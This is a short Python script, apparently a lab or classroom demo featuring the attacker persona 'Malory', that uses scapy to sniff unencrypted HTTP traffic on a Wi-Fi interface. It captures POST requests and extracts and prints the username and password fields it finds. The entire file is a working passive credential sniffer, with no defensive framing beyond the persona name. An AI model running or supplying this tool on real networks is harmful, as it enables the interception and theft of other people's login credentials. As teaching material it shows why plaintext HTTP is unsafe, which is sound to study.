from scapy.all import sniff, Raw
import re

interface = "Wi-Fi"


def process_packet(packet):
    if packet.haslayer(Raw):  # Si le paquet contient des données
        payload = packet[Raw].load.decode(errors="ignore")
        if "POST" in payload:  # Recherchez les requêtes POST
            print("[Malory] Requête interceptée :")
            print(payload)
            username = re.search(r"username=([^&]*)", payload)
            password = re.search(r"password=([^&]*)", payload)
            if username and password:
                print(f" - Nom d'utilisateur : {username.group(1)}")
                print(f" - Mot de passe : {password.group(1)}")


print("[Malory] En attente de paquets HTTP...")
sniff(iface=interface, filter="tcp port 80", prn=process_packet, store=0)
